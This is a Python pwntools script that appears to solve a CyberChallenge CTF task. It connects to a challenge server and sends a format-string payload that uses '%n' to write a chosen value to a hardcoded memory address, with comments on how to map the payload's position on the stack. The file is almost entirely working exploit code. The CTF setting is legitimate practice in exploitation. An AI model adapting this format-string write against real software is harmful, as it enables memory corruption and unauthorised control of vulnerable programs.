from pwn import *


conn = remote('answer.challs.cyberchallenge.it', '9122')

# NOTE: Really important to keep the controlled format string at a fixed size before the format
#		specifier (inclusive) '%n' since any alteration of the size leads to a different location
#		of parameters in the stack!

# Usually we can find the position by sending any format specifier (usually %x to print in Hex)
# followed by a specific characters that we can recognize immediately (es: %lx ... %lx AAAAAAAA;
# by doing this we can see where those 'A's are (we can script and map all the stack by looping
# on the arguments with something like "%{i}$lx AAAAAAAA" where 'i' is the index of for-loop)).

payload =  '%38cBBBB'	# Prints 38 characters + 4 'B's  ==> 42 characters printed
payload += '%12$n   '	# After some tests, we found the 11th argument is this string (8 Bytes)
						# So the 10th is the previous 8 Bytes and the 12th the next 8 Bytes

# Address of target variable (found in '.data' section or with tools (e.g: nm))
payload += '\x78\x10\x60\x00\x00\x00\x00\x00'

conn.recvline()
conn.send(payload)

conn.interactive()		# Without this, all this shit won't work D:
